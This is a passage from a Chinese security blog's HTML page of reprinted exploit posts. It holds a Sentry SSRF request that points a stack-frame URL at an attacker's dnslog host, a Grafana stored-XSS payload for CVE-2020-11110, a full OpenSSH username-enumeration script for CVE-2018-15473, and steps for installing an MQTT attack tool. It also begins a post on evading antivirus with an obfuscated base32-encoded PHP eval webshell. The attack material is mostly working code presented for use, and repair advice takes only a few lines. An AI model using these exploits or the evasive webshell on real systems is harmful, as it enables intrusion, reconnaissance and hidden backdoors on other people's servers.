class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
-<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
-</blockquote>
-<h2><span id="repair">Repair</span></h2><blockquote>
-<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
-</blockquote>
-<h2><span id="reference">Reference</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
-                Grafana 存储型XSS漏洞（CVE-2020-11110）
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="grafana-存储型xss漏洞cve-2020-11110">Grafana 存储型XSS漏洞（CVE-2020-11110）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> 并作补充</p>
-</blockquote>
-<h2><span id="preface">Preface</span></h2><blockquote>
-<p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE编号：</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">影响范围：</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="复现记录">复现记录</span></h2><h3><span id="测试环境部署">测试环境部署</span></h3><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
-</blockquote>
-<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
-<p>替换 url 中的 localhost，访问快照地址，点击链接🔗图标。 Stored-XSS。</p>
-<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
-</blockquote>
-<h3><span id="snapshot-快照删除">snapshot 快照删除</span></h3><blockquote>
-<p>访问 deleteUrl：</p>
-<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
-<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
-<p>可以删除 snapshot，这里算是个严重程度更高的漏洞。</p>
-</blockquote>
-<h2><span id="修复方案">修复方案</span></h2><blockquote>
-<p>版本升级。</p>
-</blockquote>
-<h2><span id="refer">Refer</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
-<p>以上！</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
-                OpenSSH用户名枚举及其检测方法（CVE-2018-15473）
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="openssh用户名枚举及其检测方法cve-2018-15473">OpenSSH用户名枚举及其检测方法（CVE-2018-15473）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> 并作补充</p>
-<p>OpenSSH 7.7前在接收到畸形的认证请求包时，会根据用户名的存在与否给出不同的响应，由此导致通过SSH服务枚举服务器的用户名。</p>
-</blockquote>
-<h3><span id="ssh-check-usernamepy-使用说明">ssh-check-username.py 使用说明</span></h3><blockquote>
-<ul>
-<li>安装依赖包 <code>pip install paramiko==2.0.8</code></li>
-<li>语法：<code>python ssh_checkusername.py ip username –port 22</code></li>
-</ul>
-</blockquote>
-<h3><span id="脚本">脚本</span></h3><blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="验证说明">验证说明：</span></h2><blockquote>
-<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
-<p>如果服务器不存在的用户，则脚本会返回<code>Invalid username</code><br> 如果升级ssh版本之后：</p>
-<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
-<p>如果服务器不存在的用户，则脚本会返回<code>Valid username</code></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/MQTT-Pwd/">
-                MQTT未授权漏洞利用
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="mqtt未授权漏洞利用">MQTT未授权漏洞利用</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suyu7/p/15290972.html">唐小风</a> 并作补充</p>
-</blockquote>
-<h3><span id="1-扫描端口">1、扫描端口</span></h3><blockquote>
-<p><img src="/2024/01/19/MQTT-Pwd/1.png" alt="image"></p>
-</blockquote>
-<h3><span id="2-mqtt-pwd安装">2、mqtt-pwd安装</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akamai-threat-research/mqtt-pwn.git</span><br><span class="line"><span class="built_in">cd</span> mqtt-pwd</span><br><span class="line">docker-compose up --build --detach</span><br><span class="line">docker-compose run cli</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discovery</span><br><span class="line">scans</span><br><span class="line">scans -i 1</span><br><span class="line">topics</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/MQTT-Pwd/2.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/Webshell-Bypass/">
-                一些webshell免杀的技巧
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="一些webshell免杀的技巧">一些webshell免杀的技巧</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9290?time__1311=n4+xuDgD9DyDRD0rxfxDqGNQhavn8P2ne4wD">pureqh</a> 并作补充</p>
-</blockquote>
-<h3><span id="0x00前言">0x00：前言</span></h3><blockquote>
-<p>由于杀软的规则在不断更新 所以很多之前的过杀软方法基本上都不行了 而且随着php7逐渐扩张 assert马也将被淘汰 所以本文将提出几种免杀思路 效果很好 而且不会被杀软的正则和沙盒规则约束。</p>
-</blockquote>
-<h3><span id="0x01自定义加密bypass">0x01：自定义加密Bypass</span></h3><blockquote>
-<p>部分杀软会直接将一些编码函数如Base64、编码后的关键字或组合函数加入了规则 比如某dir+</p>
-<p><img src="/2024/01/19/Webshell-Bypass/1.png" alt="image"></p>
-<p>比如这个 都能被检测出是shell</p>
-<p>所以为了防止这种的规则 自定义加密显然是最优解</p>
-<p>自定义加密可选性多了 只要能把加密后的字符还原回去就行 比如base32 base58 这类的base编码全家桶 或者自定义ascii移位 甚至是对称加密算法等都是可以绕过这类规则检测</p>
-<ul>
-<li>base32编码payload<br>（<a target="_blank" rel="noopener" href="https://github.com/pureqh/webshell%EF%BC%89%EF%BC%9A">https://github.com/pureqh/webshell）：</a></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;mv3gc3bierpvat2tkrnxuzlsn5ossoy&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">SYXJ</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MNWK</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$BASE32_ALPHABET</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz234567&#x27;</span>;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="variable">$v</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">      <span class="variable">$v</span> += <span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">5</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>];</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$vbits</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= (<span class="number">5</span> - <span class="variable">$vbits</span>);</span><br><span class="line">      <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span>];&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SYXJ</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">      <span 